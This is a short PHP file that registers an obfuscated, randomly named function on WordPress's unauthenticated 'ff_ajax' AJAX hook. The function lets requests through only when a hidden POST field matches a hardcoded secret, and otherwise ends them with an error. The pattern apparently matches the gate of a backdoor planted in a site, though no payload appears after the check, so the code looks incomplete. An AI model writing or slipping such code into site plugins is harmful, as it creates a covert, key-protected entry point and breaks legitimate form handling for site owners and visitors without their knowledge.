<?php

function settings_best_quantity_exporter() {
	if (!isset($_POST["ykhitkvqwmmda"]) || $_POST["ykhitkvqwmmda"] !== "mQYGizSgx6") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'settings_best_quantity_exporter', 5, 1);
